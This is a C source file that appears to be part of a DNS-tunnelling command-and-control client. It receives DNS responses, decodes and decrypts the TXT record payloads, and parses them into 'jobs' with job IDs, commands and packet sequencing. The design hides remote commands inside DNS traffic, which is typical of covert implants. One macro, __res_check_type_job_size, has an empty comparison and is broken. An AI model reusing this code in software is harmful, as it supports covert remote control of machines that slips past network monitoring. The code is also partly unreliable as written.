#include "inc/res.h"
#include "inc/dns.h"
#include "inc/util.h"

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define __res_check_type_ack_size(r, p) (p->answers[0].rdlen == 0) // ack responses are empty
#define __res_check_type_job_size(r, p)                                                                                \
  (p->answers[0].rdlen > (                                                                                             \
                                                                                                                       \
                             ))

void res_new(res_t *res) {
  bzero(res, sizeof(res_t));
}

void res_free(res_t *res) {
  free(res->data);
  bzero(res, sizeof(res_t));
}

int64_t res_recv(res_t *res, client_t *c) {
  dns_packet_t packet;
  int64_t      ret = 0;

  if ((ret = dns_recv(&packet, c)) < 0)
    return -1;

  if (!res_from_dns(res, &packet))
    return -1;

  dns_free(&packet);
  return ret;
}

bool __res_job_from_txt(res_t *res, char *txtdata, uint8_t txtlen) {
  uint16_t indx = 0;

  // read job_id, command, packet_id, is_last
  indx += copy(res->job_id, txtdata + indx, JOB_ID_SIZE);
  indx += copy(&res->command, txtdata + indx, sizeof(res->command));
  indx += copy(&res->packet_id, txtdata + indx, sizeof(res->packet_id));
  res->is_last = txtdata[indx++] == 1;

  // allocate buffer for the response data
  res->data_size = txtlen - indx;
  res->data      = malloc(res->data_size + 1);

  // read data (rest of the rdata)
  memcpy(res->data, txtdata + indx, res->data_size);
  res->data[res->data_size] = 0; // just for safety

  res->type = RES_TYPE_JOB;
  return true;
}

bool res_from_dns(res_t *res, dns_packet_t *p) {
  if (NULL == res || NULL == p) {
    errno = EINVAL;
    return false;
  }

  if ((p->header.flags & 0b1111) == DNS_RCODE_NAME_ERROR) {
    res->type = RES_TYPE_INVALID;
    return true;
  }

  else if ((p->header.flags & 0b1111) != DNS_RCODE_NO_ERROR) {
    debug("invalid DNS response code %d", (p->header.flags & 0b1111));
    return false;
  }

  dns_record_t *an = &p->answers[0];
  bzero(res, sizeof(res_t));

  /*

   * check the an->rdlen size to detect the packet type
   * and call the parser function accordingly

  */
  if (an->rdlen == 0) {
    res->type = RES_TYPE_ACK; // empty TXT response means its a job req ACK
    return true;
  }

  /*

   * TXT records are a bit weird, first byte of the record
   * actually stores the length of the TXT record (https://en.wikipedia.org/wiki/TXT_record#Format)
   * this a single rdata can contain multiple TXT records (https://news.ycombinator.com/item?id=38419272)
   * so we need to skip that byte

  */
  uint8_t txtlen  = an->rdata[0];
  char   *txtdata = an->rdata + 1;

  if ((txtlen = decode(txtdata, txtlen)) == 0) {
    debug("failed to decode rdata for res (dns header id %d)", p->header.id);
    return false;
  }

  decrypt(txtdata, txtlen);

  if (txtlen > (JOB_ID_SIZE + sizeof(res->command) + sizeof(res->packet_id) + 1))
    return __res_job_from_txt(res, txtdata, txtlen);

  debug("invalid answer size (%lu) for response", an->rdlen);
  return false;
}
